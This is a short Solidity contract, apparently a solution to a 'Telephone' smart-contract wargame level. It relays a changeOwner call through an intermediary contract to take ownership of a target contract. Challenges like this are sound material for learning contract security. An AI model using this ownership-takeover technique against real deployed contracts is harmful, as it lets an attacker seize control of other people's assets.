// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneSolution {
  function callChangeOwner(address _telephoneContract, address _eoa) external {
    bytes memory payload = abi.encodeWithSignature("changeOwner(address)", _eoa);
    (bool success, bytes memory returnData) = _telephoneContract.call(payload);
    require(success);
  }
}
